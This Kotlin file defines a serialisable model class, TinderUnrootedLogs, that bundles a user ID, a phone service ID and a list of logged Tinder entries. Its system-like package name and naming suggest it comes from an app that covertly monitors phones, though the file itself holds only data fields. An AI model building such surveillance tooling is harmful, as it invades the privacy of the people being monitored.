package com.android.services.models

import com.android.services.db.entities.TinderUnrooted
import com.google.gson.annotations.SerializedName

class TinderUnrootedLogs {
    @SerializedName("userId")
    var userId: String? = null
        private set

    @SerializedName("phoneServiceId")
    var phoneServiceId: String? = null
        private set

    @SerializedName("data")
    var tinderUnrootedList: List<TinderUnrooted>? = null
        private set

    constructor()
    constructor(
        userId: String?,
        phoneServiceId: String?,
        tinderUnrootedList: List<TinderUnrooted>?
    ) {
        this.userId = userId
        this.phoneServiceId = phoneServiceId
        this.tinderUnrootedList = tinderUnrootedList
    }
}